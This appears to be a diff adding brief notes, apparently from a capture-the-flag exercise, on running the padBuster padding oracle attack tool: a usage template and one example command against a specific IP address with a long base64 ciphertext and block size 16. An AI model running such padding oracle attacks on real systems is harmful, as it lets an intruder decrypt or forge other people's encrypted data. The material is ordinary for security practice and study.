@@ -1,0 +1,4 @@
+perl padBuster.pl http://url?post=base64 base64 blocklenght 
+
+Example:
+perl padBuster.pl http://34.74.105.127/5d716a20a5/?post=YBkuIzsUkf/zl3PxNp95C8eUVZ4i+4lb7JOxO9VaN9tPFwjFlGP0Di4mr0htA+La2QYM9N7kO5ofsOOiUevFgxcwlWRxOdShHXbPHvLp0sdMF6ZPF+Zo0xU8bquZMlvx7AmS+ioFhbJv+/mdlaCrzyz7leLwyMKXthvCqi98xuL7JCEQ//0HBtVmhGUq0UCu14xNPc7st6NRp3mZc0CNjg YBkuIzsUkf/zl3PxNp95C8eUVZ4i+4lb7JOxO9VaN9tPFwjFlGP0Di4mr0htA+La2QYM9N7kO5ofsOOiUevFgxcwlWRxOdShHXbPHvLp0sdMF6ZPF+Zo0xU8bquZMlvx7AmS+ioFhbJv+/mdlaCrzyz7leLwyMKXthvCqi98xuL7JCEQ//0HBtVmhGUq0UCu14xNPc7st6NRp3mZc0CNjg 16
